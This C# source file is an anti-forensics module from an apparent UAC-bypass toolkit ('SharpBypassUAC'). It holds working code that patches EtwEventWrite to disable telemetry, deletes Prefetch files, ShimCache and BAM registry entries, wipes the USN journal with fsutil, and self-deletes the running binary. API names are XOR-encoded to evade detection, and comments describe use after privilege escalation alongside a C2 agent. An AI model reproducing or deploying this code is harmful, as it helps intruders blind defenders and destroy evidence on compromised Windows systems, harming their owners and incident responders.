using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    /// <summary>
    /// Anti-forensic module: reduces artifacts left on disk and in registry
    /// when Sysmon is not present. All Win32 APIs resolved via D/Invoke.
    ///
    /// Capabilities:
    ///   1. ETW Bypass       - Patch ntdll!EtwEventWrite → ret 0 (kills .NET CLR telemetry)
    ///   2. Prefetch cleanup - Delete Prefetch .pf files for this binary
    ///   3. ShimCache flush  - Invalidate AppCompatCache by touching the registry timestamp
    ///   4. BAM/DAM cleanup  - Remove Binary Activity Monitor entries for current SID
    ///   5. USN Journal      - Flush $UsnJrnl delete notifications via fsutil (requires high integrity)
    ///   6. Self-delete      - Rename-on-close trick to delete running binary after exit
    /// </summary>
    public class AntiForensic
    {
        // ================================================================
        // XOR keys — different per DLL to break pattern matching
        // ================================================================
        private static readonly byte _xkN = 0x37; // ntdll
        private static readonly byte _xkK = 0x2D; // kernel32
        private static readonly byte _xkA = 0x5A; // advapi32

        // ================================================================
        // XOR-encoded strings (ntdll group, key 0x37)
        // ================================================================

        // "ntdll.dll" ^ 0x37
        private static readonly byte[] _ntdll = new byte[] {
            0x59, 0x43, 0x53, 0x53, 0x59, 0x17, 0x53, 0x59, 0x59
        };
        // "EtwEventWrite" ^ 0x37
        private static readonly byte[] _etwWrite = new byte[] {
            0x72, 0x43, 0x40, 0x72, 0x41, 0x52, 0x57, 0x43, 0x64, 0x45, 0x56, 0x43, 0x52
        };

        // ================================================================
        // XOR-encoded strings (kernel32 group, key 0x2D)
        // ================================================================

        // "kernel32.dll" ^ 0x2D
        private static readonly byte[] _k32 = new byte[] {
            0x46, 0x48, 0x5F, 0x43, 0x48, 0x41, 0x1E, 0x1F, 0x03, 0x49, 0x41, 0x41
        };
        // "VirtualProtect" ^ 0x2D
        private static readonly byte[] _virtProt = new byte[] {
            0x7B, 0x44, 0x5F, 0x47, 0x48, 0x4C, 0x41, 0x7D, 0x5F, 0x42, 0x47, 0x48, 0x4E, 0x47
        };
        // "GetCurrentProcessId" ^ 0x2D
        private static readonly byte[] _getCurPid = new byte[] {
            0x6A, 0x48, 0x47, 0x6E, 0x48, 0x5F, 0x5F, 0x48, 0x43, 0x47, 0x7D, 0x5F, 0x42, 0x4E,
            0x48, 0x5E, 0x5E, 0x64, 0x49
        };
        // "MoveFileExW" ^ 0x2D
        private static readonly byte[] _moveFileEx = new byte[] {
            0x60, 0x42, 0x41, 0x48, 0x69, 0x44, 0x41, 0x48, 0x72, 0x5B, 0x7A
        };
        // "CreateFileW" ^ 0x2D
        private static readonly byte[] _createFileW = new byte[] {
            0x6E, 0x5F, 0x48, 0x4C, 0x47, 0x48, 0x69, 0x44, 0x41, 0x48, 0x7A
        };
        // "SetFileInformationByHandle" ^ 0x2D
        private static readonly byte[] _setFileInfo = new byte[] {
            0x7E, 0x48, 0x47, 0x69, 0x44, 0x41, 0x48, 0x64, 0x43, 0x49, 0x42, 0x5F, 0x40, 0x4C,
            0x47, 0x44, 0x42, 0x43, 0x6F, 0x58, 0x65, 0x4C, 0x43, 0x49, 0x41, 0x48
        };
        // "CloseHandle" ^ 0x2D
        private static readonly byte[] _closeH = new byte[] {
            0x6E, 0x41, 0x42, 0x5E, 0x48, 0x65, 0x4C, 0x43, 0x49, 0x41, 0x48
        };
        // "DeleteFileW" ^ 0x2D
        private static readonly byte[] _deleteFileW = new byte[] {
            0x69, 0x48, 0x41, 0x48, 0x47, 0x48, 0x69, 0x44, 0x41, 0x48, 0x7A
        };

        // ================================================================
        // XOR-encoded strings (advapi32 group, key 0x5A)
        // ================================================================

        // "advapi32.dll" ^ 0x5A
        private static readonly byte[] _adv = new byte[] {
            0x3B, 0x3E, 0x2C, 0x3B, 0x2A, 0x33, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36
        };
        // "RegOpenKeyExW" ^ 0x5A
        private static readonly byte[] _regOpenKeyEx = new byte[] {
            0x08, 0x3F, 0x3D, 0x15, 0x2A, 0x3F, 0x34, 0x11, 0x3F, 0x29, 0x1F, 0x22, 0x0D
        };
        // "RegDeleteValueW" ^ 0x5A
        private static readonly byte[] _regDelVal = new byte[] {
            0x08, 0x3F, 0x3D, 0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x0C, 0x3B, 0x36, 0x2F, 0x3F,
            0x0D
        };
        // "RegEnumValueW" ^ 0x5A
        private static readonly byte[] _regEnumVal = new byte[] {
            0x08, 0x3F, 0x3D, 0x1F, 0x34, 0x2F, 0x33, 0x0C, 0x3B, 0x36, 0x2F, 0x3F, 0x0D
        };
        // "RegCloseKey" ^ 0x5A
        private static readonly byte[] _regCloseKey = new byte[] {
            0x08, 0x3F, 0x3D, 0x19, 0x36, 0x35, 0x29, 0x3F, 0x11, 0x3F, 0x29
        };
        // "RegDeleteKeyExW" ^ 0x5A
        private static readonly byte[] _regDelKeyEx = new byte[] {
            0x08, 0x3F, 0x3D, 0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x11, 0x3F, 0x29, 0x1F, 0x22,
            0x0D
        };

        // ================================================================
        // Constants
        // ================================================================
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_EXECUTE_READ = 0x20;

        // MOVEFILE_DELAY_UNTIL_REBOOT
        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;

        // FILE_RENAME_INFO / FileRenameInfo class = 3
        private const int FileRenameInfo = 3;
        // FILE_DISPOSITION_INFO / FileDispositionInfo class = 4
        private const int FileDispositionInfo = 4;

        private const uint GENERIC_ALL = 0x10000000;
        private const uint DELETE = 0x00010000;
        private const uint FILE_SHARE_READ = 0x00000001;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        // Registry
        private const uint KEY_ALL_ACCESS = 0xF003F;
        private const uint KEY_READ = 0x20019;
        private const uint KEY_QUERY_VALUE = 0x0001;
        private const uint KEY_SET_VALUE = 0x0002;
        private static readonly UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        private const int ERROR_SUCCESS = 0;
        private const int ERROR_NO_MORE_ITEMS = 259;

        // ================================================================
        // D/Invoke delegates
        // ================================================================
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool VirtualProtectDelegate(IntPtr lpAddress, UIntPtr dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint GetCurrentProcessIdDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate bool MoveFileExWDelegate(string lpExistingFileName, string lpNewFileName, uint dwFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate IntPtr CreateFileWDelegate(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool SetFileInformationByHandleDelegate(IntPtr hFile, int FileInformationClass,
            IntPtr lpFileInformation, uint dwBufferSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool CloseHandleDelegate(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate bool DeleteFileWDelegate(string lpFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate int RegOpenKeyExWDelegate(UIntPtr hKey, string lpSubKey, uint ulOptions,
            uint samDesired, out IntPtr phkResult);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate int RegDeleteValueWDelegate(IntPtr hKey, string lpValueName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate int RegEnumValueWDelegate(IntPtr hKey, uint dwIndex, StringBuilder lpValueName,
            ref uint lpcchValueName, IntPtr lpReserved, IntPtr lpType, IntPtr lpData, IntPtr lpcbData);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate int RegCloseKeyDelegate(IntPtr hKey);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        delegate int RegDeleteKeyExWDelegate(UIntPtr hKey, string lpSubKey, uint samDesired, uint Reserved);

        // ================================================================
        // FILE_RENAME_INFO structure for SetFileInformationByHandle
        // ================================================================
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct FILE_RENAME_INFO
        {
            public int ReplaceIfExists;   // BOOLEAN but 4 bytes aligned
            public IntPtr RootDirectory;
            public uint FileNameLength;   // in bytes
            // FileName follows in the buffer — we marshal manually
        }

        // ================================================================
        // In-memory execution detection
        // ================================================================

        /// <summary>
        /// Detect if the assembly is running in-memory (execute-assembly,
        /// Assembly.Load, reflective loading) vs from a file on disk.
        ///
        /// Indicators:
        ///   - Assembly.GetEntryAssembly()?.Location returns "" when loaded
        ///     via Assembly.Load(byte[]) or execute-assembly
        ///   - Assembly.GetExecutingAssembly().Location also returns "" for
        ///     in-memory loaded assemblies
        ///
        /// When running in-memory:
        ///   - No file on disk → no Prefetch, no ShimCache entry, no USN record
        ///   - Self-delete is meaningless (nothing to delete)
        ///   - ETW bypass still applies (current process generates events)
        ///   - BAM/DAM may still log the HOST process (e.g., the C2 agent)
        /// </summary>
        private static bool _inMemory = false;

        public static bool IsInMemory()
        {
            try
            {
                // Primary check: entry assembly location
                var entry = System.Reflection.Assembly.GetEntryAssembly();
                if (entry == null || string.IsNullOrEmpty(entry.Location))
                {
                    _inMemory = true;
                    return true;
                }

                // Secondary check: executing assembly location
                var executing = System.Reflection.Assembly.GetExecutingAssembly();
                if (executing != null && string.IsNullOrEmpty(executing.Location))
                {
                    _inMemory = true;
                    return true;
                }

                return false;
            }
            catch
            {
                // If reflection fails, assume in-memory (safer default)
                _inMemory = true;
                return true;
            }
        }

        // ================================================================
        // Public API
        // ================================================================

        /// <summary>
        /// Run all anti-forensic routines. Call AFTER bypass succeeds and
        /// elevated payload is running.
        ///
        /// Automatically detects in-memory vs disk execution context:
        ///   - Disk:      full cleanup (ETW + Prefetch + ShimCache + BAM + USN + self-delete)
        ///   - In-memory: ETW patch + BAM cleanup only (no disk artifacts to clean)
        /// </summary>
        /// <param name="selfPath">Full path to this binary, for self-delete. Can be null for in-memory execution.</param>
        /// <param name="isElevated">True if running as high integrity (post-bypass).</param>
        public static void Run(string selfPath, bool isElevated)
        {
            bool inMem = IsInMemory();

            if (inMem)
                Console.WriteLine("[*] Anti-forensic cleanup starting (in-memory mode)...");
            else
                Console.WriteLine("[*] Anti-forensic cleanup starting...");

            // ---- 1. ETW bypass (always, any integrity, any context) ----
            PatchEtw();

            // ---- Disk-only operations: skip when running in-memory ----
            if (!inMem)
            {
                // ---- 2. Prefetch cleanup (high integrity required) ----
                if (isElevated)
                    CleanPrefetch(selfPath);

                // ---- 3. ShimCache / AppCompatCache flush (high integrity) ----
                if (isElevated)
                    FlushShimCache();
            }

            // ---- 4. BAM/DAM cleanup (high integrity) ----
            // BAM may log the host process even for in-memory execution
            if (isElevated)
            {
                CleanBAM();
            }

            // ---- Disk-only operations continued ----
            if (!inMem)
            {
                // ---- 5. USN Journal flush for specific files (high integrity) ----
                if (isElevated)
                    FlushUsnJournal();

                // ---- 6. Self-delete via rename trick ----
                SelfDelete(selfPath);
            }

            if (inMem)
                Console.WriteLine("[+] Anti-forensic cleanup complete (in-memory: no disk artifacts to clean)");
            else
                Console.WriteLine("[+] Anti-forensic cleanup complete");
        }

        /// <summary>
        /// Lightweight version: only ETW patch + self-delete (if on disk).
        /// For medium integrity (pre-bypass) scenarios.
        /// </summary>
        public static void RunLight(string selfPath)
        {
            PatchEtw();

            // Self-delete only makes sense when running from disk
            if (!IsInMemory())
                SelfDelete(selfPath);
        }

        // ================================================================
        // 1. ETW Bypass — Patch EtwEventWrite to xor eax,eax; ret
        // ================================================================
        private static void PatchEtw()
        {
            try
            {
                string ntdll = W.X(_ntdll, _xkN);
                string etwFunc = W.X(_etwWrite, _xkN);
                string k32 = W.X(_k32, _xkK);

                // Resolve EtwEventWrite address
                IntPtr hNtdll = W.M0(ntdll);
                IntPtr etwAddr = W.M1(hNtdll, etwFunc);

                // Resolve VirtualProtect
                var virtualProtect = W.G<VirtualProtectDelegate>(k32, W.X(_virtProt, _xkK));

                // Patch: xor eax, eax (0x33 0xC0) + ret (0xC3) = return STATUS_SUCCESS
                byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };

                uint oldProtect;
                if (!virtualProtect(etwAddr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
                {
                    Console.WriteLine("[-] ETW: VirtualProtect failed");
                    return;
                }

                Marshal.Copy(patch, 0, etwAddr, patch.Length);

                // Restore original protection
                uint ignored;
                virtualProtect(etwAddr, (UIntPtr)patch.Length, oldProtect, out ignored);

                Console.WriteLine("[+] ETW: EtwEventWrite patched (CLR telemetry disabled)");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ETW patch failed: " + ex.Message);
            }
        }

        // ================================================================
        // 2. Prefetch Cleanup — Delete .pf files matching this binary
        // ================================================================
        private static void CleanPrefetch(string selfPath)
        {
            try
            {
                string prefetchDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "Prefetch");

                if (!Directory.Exists(prefetchDir))
                {
                    Console.WriteLine("[-] Prefetch: directory not found");
                    return;
                }

                // Get binary name without extension, uppercase (Prefetch naming convention)
                string binName = Path.GetFileNameWithoutExtension(selfPath).ToUpper();
                string k32 = W.X(_k32, _xkK);
                var deleteFile = W.G<DeleteFileWDelegate>(k32, W.X(_deleteFileW, _xkK));

                int deleted = 0;
                foreach (string pf in Directory.GetFiles(prefetchDir, "*.pf"))
                {
                    string pfName = Path.GetFileName(pf).ToUpper();
                    // Prefetch format: BINARYNAME.EXE-XXXXXXXX.pf
                    if (pfName.StartsWith(binName))
                    {
                        if (deleteFile(pf))
                        {
                            deleted++;
                        }
                    }
                }

                if (deleted > 0)
                    Console.WriteLine("[+] Prefetch: deleted " + deleted + " file(s)");
                else
                    Console.WriteLine("[*] Prefetch: no matching files found");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Prefetch cleanup failed: " + ex.Message);
            }
        }

        // ================================================================
        // 3. ShimCache / AppCompatCache flush
        //
        // IMPORTANT LIMITATION:
        //   AppCompatCache has TWO copies:
        //     (a) Kernel memory (ahcache.sys) — LIVE cache, updated immediately
        //         when any binary is created/modified on disk. NOT accessible
        //         from userland. Live forensic tools (Volatility, KAPE) can
        //         extract this.
        //     (b) Registry value — snapshot written ONLY at shutdown/reboot.
        //         This is what we delete here.
        //
        //   Deleting the registry value removes the OLD snapshot (from previous
        //   boot) but does NOT touch the live kernel cache. On next shutdown,
        //   the kernel writes its current cache back → our entry reappears.
        //
        //   On servers that rarely reboot, this means:
        //     - Registry snapshot is stale (pre-boot data) → deleting it
        //       removes old evidence but our entry survives in kernel memory
        //     - Live acquisition WILL find our entry regardless
        //
        //   Best mitigation: avoid disk-based execution entirely (reflective
        //   loading, execute-assembly) → no file on disk → no ShimCache entry.
        //   This function is a partial measure — it clears the registry
        //   snapshot and reduces offline forensic evidence when combined with
        //   self-delete and Prefetch cleanup.
        // ================================================================
        private static void FlushShimCache()
        {
            try
            {
                string adv = W.X(_adv, _xkA);
                var regOpenKeyEx = W.G<RegOpenKeyExWDelegate>(adv, W.X(_regOpenKeyEx, _xkA));
                var regDeleteValue = W.G<RegDeleteValueWDelegate>(adv, W.X(_regDelVal, _xkA));
                var regCloseKey = W.G<RegCloseKeyDelegate>(adv, W.X(_regCloseKey, _xkA));

                // HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
                string subKey = "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache";

                IntPtr hKey;
                int result = regOpenKeyEx(HKEY_LOCAL_MACHINE, subKey, 0, KEY_SET_VALUE, out hKey);
                if (result != ERROR_SUCCESS)
                {
                    Console.WriteLine("[-] ShimCache: RegOpenKeyEx failed (" + result + ")");
                    return;
                }

                // Delete AppCompatCache value — clears registry snapshot only.
                // Live kernel cache (ahcache.sys) is NOT affected.
                result = regDeleteValue(hKey, "AppCompatCache");
                regCloseKey(hKey);

                if (result == ERROR_SUCCESS)
                    Console.WriteLine("[+] ShimCache: registry snapshot deleted (kernel cache still live)");
                else
                    Console.WriteLine("[-] ShimCache: RegDeleteValue failed (" + result + ")");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] ShimCache flush failed: " + ex.Message);
            }
        }

        // ================================================================
        // 4. BAM/DAM Cleanup — Remove execution traces from
        //    HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>
        // ================================================================
        private static void CleanBAM()
        {
            try
            {
                string adv = W.X(_adv, _xkA);
                var regOpenKeyEx = W.G<RegOpenKeyExWDelegate>(adv, W.X(_regOpenKeyEx, _xkA));
                var regDeleteValue = W.G<RegDeleteValueWDelegate>(adv, W.X(_regDelVal, _xkA));
                var regEnumValue = W.G<RegEnumValueWDelegate>(adv, W.X(_regEnumVal, _xkA));
                var regCloseKey = W.G<RegCloseKeyDelegate>(adv, W.X(_regCloseKey, _xkA));

                // Get current user's SID
                string sid = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;

                // BAM registry path
                string bamPath = "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\" + sid;

                IntPtr hKey;
                int result = regOpenKeyEx(HKEY_LOCAL_MACHINE, bamPath, 0,
                    KEY_QUERY_VALUE | KEY_SET_VALUE, out hKey);

                if (result != ERROR_SUCCESS)
                {
                    // BAM may not exist on older Windows versions
                    Console.WriteLine("[*] BAM: not present or access denied (" + result + ")");
                    return;
                }

                // Get our binary path in the format BAM stores it
                // BAM stores full device path: \Device\HarddiskVolume#\path\to\binary.exe
                // We'll match by binary filename since device path varies
                string selfName = Path.GetFileName(
                    System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName).ToLower();

                // Enumerate all values and delete ones matching our binary
                uint index = 0;
                int deleted = 0;
                var toDelete = new System.Collections.Generic.List<string>();

                while (true)
                {
                    uint nameLen = 1024;
                    StringBuilder valueName = new StringBuilder((int)nameLen);

                    result = regEnumValue(hKey, index, valueName, ref nameLen,
                        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                    if (result == ERROR_NO_MORE_ITEMS)
                        break;

                    if (result == ERROR_SUCCESS)
                    {
                        string name = valueName.ToString().ToLower();
                        if (name.Contains(selfName) || name.Contains("sharpbypassuac"))
                        {
                            toDelete.Add(valueName.ToString());
                        }
                    }
                    index++;
                }

                foreach (string valName in toDelete)
                {
                    if (regDeleteValue(hKey, valName) == ERROR_SUCCESS)
                        deleted++;
                }

                regCloseKey(hKey);

                if (deleted > 0)
                    Console.WriteLine("[+] BAM: deleted " + deleted + " execution trace(s)");
                else
                    Console.WriteLine("[*] BAM: no matching entries");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] BAM cleanup failed: " + ex.Message);
            }
        }

        // ================================================================
        // 5. USN Journal — flush via fsutil to remove file-creation records
        //    This is aggressive and may affect system performance temporarily.
        // ================================================================
        private static void FlushUsnJournal()
        {
            try
            {
                // Get the system drive letter
                string systemDrive = Environment.GetFolderPath(Environment.SpecialFolder.Windows)
                    .Substring(0, 2); // "C:"

                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "fsutil",
                    Arguments = "usn deletejournal /d " + systemDrive,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.WaitForExit(5000);
                    if (proc.ExitCode == 0)
                        Console.WriteLine("[+] USN Journal: deleted on " + systemDrive);
                    else
                        Console.WriteLine("[-] USN Journal: fsutil returned " + proc.ExitCode);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] USN Journal flush failed: " + ex.Message);
            }
        }

        // ================================================================
        // 6. Self-Delete — rename stream trick + mark delete-on-close
        //    Works on NTFS: rename the default data stream to a non-default
        //    name, then mark for deletion. The file disappears on handle close.
        //    Fallback: MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT.
        // ================================================================
        private static void SelfDelete(string selfPath)
        {
            try
            {
                if (string.IsNullOrEmpty(selfPath) || !File.Exists(selfPath))
                {
                    Console.WriteLine("[*] Self-delete: binary path not available");
                    return;
                }

                string k32 = W.X(_k32, _xkK);
                var createFileW = W.G<CreateFileWDelegate>(k32, W.X(_createFileW, _xkK));
                var setFileInfo = W.G<SetFileInformationByHandleDelegate>(k32, W.X(_setFileInfo, _xkK));
                var closeHandle = W.G<CloseHandleDelegate>(k32, W.X(_closeH, _xkK));

                // Step 1: Open file with DELETE access
                IntPtr hFile = createFileW(selfPath, DELETE, FILE_SHARE_READ,
                    IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    // Fallback: schedule deletion on reboot
                    SelfDeleteFallback(selfPath);
                    return;
                }

                // Step 2: Rename the default data stream to ":dead"
                // This makes the main file entry unnamed, allowing deletion while running
                string newStreamName = ":dead";
                byte[] nameBytes = Encoding.Unicode.GetBytes(newStreamName);

                int structSize = Marshal.SizeOf(typeof(FILE_RENAME_INFO));
                int totalSize = structSize + nameBytes.Length;
                IntPtr buffer = Marshal.AllocHGlobal(totalSize);

                try
                {
                    // Zero the buffer
                    for (int i = 0; i < totalSize; i++)
                        Marshal.WriteByte(buffer, i, 0);

                    // ReplaceIfExists = FALSE
                    Marshal.WriteInt32(buffer, 0, 0);
                    // RootDirectory = NULL
                    Marshal.WriteIntPtr(buffer, IntPtr.Size == 8 ? 8 : 4, IntPtr.Zero);
                    // FileNameLength in bytes
                    Marshal.WriteInt32(buffer, IntPtr.Size == 8 ? 16 : 8, nameBytes.Length);
                    // FileName
                    Marshal.Copy(nameBytes, 0, IntPtr.Add(buffer, IntPtr.Size == 8 ? 20 : 12), nameBytes.Length);

                    if (!setFileInfo(hFile, FileRenameInfo, buffer, (uint)totalSize))
                    {
                        closeHandle(hFile);
                        SelfDeleteFallback(selfPath);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }

                closeHandle(hFile);

                // Step 3: Re-open the renamed stream and mark for deletion
                hFile = createFileW(selfPath, DELETE, FILE_SHARE_READ,
                    IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

                if (hFile != INVALID_HANDLE_VALUE)
                {
                    // FILE_DISPOSITION_INFO: DeleteFile = TRUE
                    IntPtr dispBuffer = Marshal.AllocHGlobal(4);
                    try
                    {
                        Marshal.WriteInt32(dispBuffer, 1); // DeleteFile = TRUE
                        setFileInfo(hFile, FileDispositionInfo, dispBuffer, 4);
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(dispBuffer);
                    }
                    closeHandle(hFile);
                }

                Console.WriteLine("[+] Self-delete: binary marked for deletion");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Self-delete failed: " + ex.Message);
                SelfDeleteFallback(selfPath);
            }
        }

        /// <summary>
        /// Fallback self-delete: schedule deletion on next reboot via MoveFileEx.
        /// </summary>
        private static void SelfDeleteFallback(string selfPath)
        {
            try
            {
                string k32 = W.X(_k32, _xkK);
                var moveFileEx = W.G<MoveFileExWDelegate>(k32, W.X(_moveFileEx, _xkK));

                if (moveFileEx(selfPath, null, MOVEFILE_DELAY_UNTIL_REBOOT))
                    Console.WriteLine("[+] Self-delete: scheduled for next reboot");
                else
                    Console.WriteLine("[-] Self-delete fallback failed: " + Marshal.GetLastWin32Error());
            }
            catch
            {
                Console.WriteLine("[-] Self-delete: all methods failed");
            }
        }
    }
}
